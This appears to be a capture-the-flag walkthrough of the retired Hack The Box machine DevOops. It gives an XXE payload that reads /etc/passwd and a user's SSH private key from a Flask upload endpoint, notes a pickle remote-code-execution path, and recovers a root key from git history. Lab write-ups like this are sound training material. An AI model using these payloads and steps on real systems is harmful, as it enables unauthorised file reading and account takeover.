---
machine: DevOops
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, xxe, flask, git-history, ssh-keys, pickle]
---

# DevOops — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (ref.), publishable.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A Flask/Gunicorn blog API (5000) with an `/upload` endpoint that parses **XML** without disabling external entities: **XXE** reading server files, starting with `roosa`'s SSH key. Once inside, `.bash_history` points to a git repo in `~/work/blogfeed`; the **commit history** still holds a **root** private key that was deleted later.

## Recon

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
5000/tcp  http  Gunicorn (Flask)
```

```bash
gobuster dir -u http://<IP>:5000/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/feed    (200)
/upload  (200)
```

The site takes a "post" as XML and shows it processed. The response echoes the XML fields, which already hints at a parser with entities enabled.

## Access through XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Post>
  <Author>a</Author>
  <Subject>s</Subject>
  <Content>&xxe;</Content>
</Post>
```

```bash
curl -s -X POST http://<IP>:5000/upload -H 'Content-Type: application/xml' --data-binary @payload.xml
```

`/etc/passwd` confirms the read and reveals `roosa`. Target her key:

```xml
<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa">
```

The response carries the full private key (a blind case would need `php://filter`; not here).

```bash
chmod 600 id_rsa
ssh -i id_rsa roosa@<IP>
cat ~/user.txt
```

Alternative route (not used here): `/newpost` **`pickle`**-deserialises a base64 body (the route originates in `src/feed.py`), giving RCE as `roosa` directly. The code lives in `/home/roosa/deploy/src/feed.py`.

## Escalation through git history

```bash
cat ~/.bash_history
```

It shows `mv resources/authcredentials.key ...`, `git add` and `git commit`. The repository is `~/work/blogfeed`:

```bash
cd ~/work/blogfeed
git log --oneline
# 33e87c3 reverted accidental commit with proper key
# d387abf add key for feed integration from tnerprise backend
git log -p | grep -A30 "BEGIN RSA PRIVATE KEY"
```

`d387abf` adds the key and `33e87c3` "reverts" it: the old object survives, so the secret was never deleted:

```bash
git show d387abf:resources/integration/authcredentials.key > /tmp/root.key
chmod 600 /tmp/root.key
ssh -i /tmp/root.key root@<IP>
cat /root/root.txt
```

## Lessons

- An XML parser with external entities enabled is arbitrary file read, and SSH keys are the natural loot.
- `pickle` in the same service is a second RCE path: two flaws, one badly designed endpoint.
- `git` does not forget: a secret removed from HEAD survives in history, and `.bash_history` tells you where to look.
- Detection: XML with `DOCTYPE`/`ENTITY` in requests, and SSH logins with keys from new IPs.
